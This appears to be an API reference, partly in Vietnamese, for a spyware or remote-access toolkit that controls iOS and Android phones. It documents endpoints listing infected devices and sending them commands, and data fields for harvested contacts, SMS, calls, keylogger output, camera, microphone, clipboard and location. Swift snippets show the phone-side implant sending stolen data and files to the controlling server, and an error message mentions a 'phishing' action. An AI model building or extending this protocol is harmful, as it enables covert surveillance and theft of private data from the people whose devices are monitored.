# iOS API Reference

Tài liệu API endpoints, Socket.IO events, và data formats cho iOS developers.

## Base URL

```
http://localhost:3000  (Development)
https://your-server.com  (Production)
```

## REST API Endpoints

### Get All Devices

```
GET /api/v1/devices
```

**Query Parameters:**
- `platform` (optional): Filter by platform (`android` or `ios`)
- `online` (optional): Filter by online status (`true` or `false`)

**Response:**
```json
{
  "success": true,
  "data": [
    {
      "id": "device-id",
      "model": "iPhone 14 Pro",
      "version": "17.0",
      "ip": "192.168.1.100",
      "platform": "ios",
      "platformVersion": "iOS 17.0",
      "connectedAt": "2024-01-01T00:00:00.000Z",
      "online": true
    }
  ],
  "count": 1,
  "filters": {}
}
```

### Get Device by ID

```
GET /api/v1/devices/:id
```

**Response:**
```json
{
  "success": true,
  "data": {
    "info": {
      "id": "device-id",
      "model": "iPhone 14 Pro",
      "version": "17.0",
      "ip": "192.168.1.100",
      "platform": "ios",
      "platformVersion": "iOS 17.0",
      "connectedAt": "2024-01-01T00:00:00.000Z",
      "online": true
    },
    "data": {
      "contacts": [],
      "sms": [],
      "calls": [],
      "gallery": [],
      "camera": {
        "main": [],
        "selfie": []
      },
      "screenshots": [],
      "keylogger": {
        "enabled": false,
        "data": []
      },
      "clipboard": "",
      "location": null,
      "apps": [],
      "files": [],
      "microphone": [],
      "audio": {
        "playing": false,
        "current": null
      }
    }
  }
}
```

### Execute Action

```
POST /api/v1/devices/:id/action
```

**Request Body:**
```json
{
  "action": "screenshot",
  "params": {}
}
```

**Response:**
```json
{
  "success": true,
  "message": "Action sent to device",
  "action": "screenshot",
  "platform": "ios"
}
```

**Error Response:**
```json
{
  "success": false,
  "error": "Action 'phishing' is not supported on ios platform"
}
```

## Socket.IO Events

### Client to Server

#### Connect

```swift
socket.connect(withAuth: [
    "model": "iPhone 14 Pro",
    "version": "17.0",
    "ip": "192.168.1.100",
    "platform": "ios",
    "platform-version": "iOS 17.0"
])
```

#### Send Data

```swift
socket.emit("data", [
    "type": "contacts",
    "payload": contactsArray
])
```

#### Command Response

```swift
socket.emit("commend-response", [
    "request": "contacts",
    "result": [
        "contacts": contactsArray
    ]
])
```

#### File Upload

```swift
socket.emit("file", [
    "name": "image.jpg",
    "data": base64EncodedData,
    "type": "image/jpeg"
])
```

### Server to Client

#### Command

```swift
socket.on("commend") { data, ack in
    // data[0] = [
    //   "request": "screenshot",
    //   "extras": []
    // ]
}
```

#### Ping

```swift
socket.on("ping") { data, ack in
    socket.emit("pong", [])
}
```

## Data Formats

### Contacts

```json
{
  "id": "contact-id",
  "name": "John Doe",
  "phone": "+1234567890",
  "email": "john@example.com"
}
```

### SMS

```json
{
  "id": "sms-id",
  "address": "+1234567890",
  "body": "Hello World",
  "date": "2024-01-01T00:00:00.000Z",
  "type": "read"
}
```

### Calls

```json
{
  "id": "call-id",
  "number": "+1234567890",
  "type": "incoming",
  "date": "2024-01-01T00:00:00.000Z",
  "duration": 60
}
```

### Location

```json
{
  "latitude": 37.7749,
  "longitude": -122.4194,
  "accuracy": 10.0,
  "altitude": 0.0,
  "timestamp": "2024-01-01T00:00:00.000Z"
}
```

### Apps

```json
{
  "packageName": "com.example.app",
  "name": "Example App",
  "version": "1.0.0",
  "installed": true
}
```

## Actions

Xem [IOS_ACTIONS.md](./IOS_ACTIONS.md) để biết danh sách đầy đủ actions hỗ trợ trên iOS.

## Error Codes

- `400`: Bad Request - Invalid parameters or unsupported action
- `404`: Not Found - Device not found or not connected
- `500`: Internal Server Error - Server error

## Rate Limiting

- API: 100 requests per minute
- Socket.IO: 10 events per second per connection

## Authentication

Hiện tại server không yêu cầu authentication. Trong production, nên implement authentication.

## Examples

Xem [examples/](./examples/) folder để biết example code và data formats.

